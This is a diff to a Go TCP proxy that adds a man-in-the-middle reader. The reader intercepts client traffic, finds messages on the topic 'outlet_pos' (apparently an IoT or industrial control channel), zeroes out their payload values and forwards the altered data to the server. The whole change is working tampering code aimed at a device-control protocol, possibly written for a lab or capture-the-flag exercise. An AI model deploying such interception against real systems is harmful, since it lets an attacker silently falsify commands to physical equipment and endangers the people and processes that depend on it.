@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io"
 	"net"
@@ -8,6 +9,39 @@ import (
 	"strings"
 	"syscall"
 )
+
+type mitm struct {
+	c net.Conn
+}
+
+func (this *mitm) Read(p []byte) (int, error) {
+	pub := make([]byte, 32*1024)
+
+	n, err := this.c.Read(pub)
+	if err != nil {
+		return 0, err
+	}
+
+	var (
+		targetTopic  = []byte("outlet_pos")
+		lTargetTopic = len(targetTopic) + 4
+	)
+
+	if bytes.Contains(pub, targetTopic) {
+		var (
+			newVal = []byte(strings.Repeat("0", n-lTargetTopic))
+		)
+
+		copy(p, pub[:lTargetTopic])
+		copy(p[lTargetTopic:], newVal)
+	} else {
+		copy(p, pub[:n])
+	}
+
+	fmt.Println(string(p))
+
+	return n, nil
+}
 
 func main() {
 	if len(os.Args) < 2 {
@@ -64,9 +98,8 @@ func main() {
 	fmt.Printf("connected to %s\n", remote)
 
 	go func() {
-		// copy what client is sending to server to STDOUT
-		w := io.MultiWriter(r, os.Stdout)
-		io.Copy(w, c)
+		m := &mitm{c}
+		io.Copy(r, m)
 	}()
 
 	io.Copy(c, r)
